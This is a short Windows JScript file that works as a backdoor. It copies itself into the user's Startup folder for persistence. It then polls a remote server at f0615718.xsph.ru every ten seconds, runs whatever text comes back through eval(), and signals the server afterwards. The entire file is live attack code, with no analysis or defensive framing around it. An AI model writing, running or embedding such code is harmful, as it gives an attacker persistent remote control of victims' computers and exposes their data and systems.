var fs = WScript.CreateObject("Scripting.FileSystemObject");
var shell = WScript.CreateObject("WScript.Shell");

fs.CopyFile(WScript.ScriptFullName, shell.ExpandEnvironmentStrings("%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + WScript.ScriptName));

while(true){
	var xmlhttp = WScript.CreateObject("Microsoft.XMLHTTP");


	xmlhttp.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/USER_ID.txt?rand=" + new Date().getTime(), false);
	xmlhttp.setRequestHeader('Cache-Control', 'no-cache, no-store, max-age=0');
	xmlhttp.setRequestHeader("Expires", "Tue, 01 Jan 1980 1:00:00 GMT");
	xmlhttp.Send();
	tmp();
	function tmp(){
		if(xmlhttp.status != 200){
			cmd = "null";
			return;
		}
		cmd = xmlhttp.responseText;
		if(cmd != "null"){
			eval(cmd);
			var _ = WScript.CreateObject("Microsoft.XMLHTTP");
			_.Open("GET", "http://f0615718.xsph.ru/ProgramData/ShellExecute/getfile.php?fn=USER_ID.txt&data=null", false);
			_.Send();
		}
	}
	WScript.Sleep(10000);
}